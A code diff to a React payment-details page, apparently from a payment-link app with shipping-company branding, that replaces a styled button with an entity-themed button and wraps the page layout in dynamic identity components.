@@ -8,6 +8,8 @@ import { useLink } from "@/hooks/useSupabase";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
 import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck } from "lucide-react";
+import { DynamicIdentity, EntityHeader, EntityContainer, EntityButton } from "@/components/DynamicIdentity";
+import { getPaymentEntityType } from "@/lib/paymentEntityHelper";
 
 const PaymentDetails = () => {
   const { id } = useParams();
@@ -62,6 +64,9 @@ const PaymentDetails = () => {
 
   // Format amount with currency symbol and name
   const formattedAmount = formatCurrency(amount, countryCode);
+  
+  // Determine entity type based on link data
+  const entityType = linkData ? getPaymentEntityType(linkData) : 'local_payment';
   
   const handleProceed = () => {
     // Check payment method from link data
@@ -151,17 +156,15 @@ const PaymentDetails = () => {
       </div>
       
       {/* Proceed Button */}
-      <Button
+      <EntityButton
+        entityType={entityType}
+        variant="primary"
         onClick={handleProceed}
-        size="lg"
-        className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
-        style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-        }}
+        className="w-full text-sm sm:text-lg py-5 sm:py-7"
       >
         <span className="ml-2">الدفع بالبطاقة</span>
         <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
-      </Button>
+      </EntityButton>
     
       <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
         بالمتابعة، أنت توافق على الشروط والأحكام
@@ -170,13 +173,17 @@ const PaymentDetails = () => {
   );
 
   return (
-    <LayoutComponent
-      companyKey={serviceKey}
-      trackingNumber={shippingInfo?.tracking_number}
-      amount={formattedAmount}
-    >
-      {paymentContent}
-    </LayoutComponent>
+    <DynamicIdentity entityType={entityType}>
+      <EntityContainer entityType={entityType} useBackgroundImage={false}>
+        <LayoutComponent
+          companyKey={serviceKey}
+          trackingNumber={shippingInfo?.tracking_number}
+          amount={formattedAmount}
+        >
+          {paymentContent}
+        </LayoutComponent>
+      </EntityContainer>
+    </DynamicIdentity>
   );
 };
 
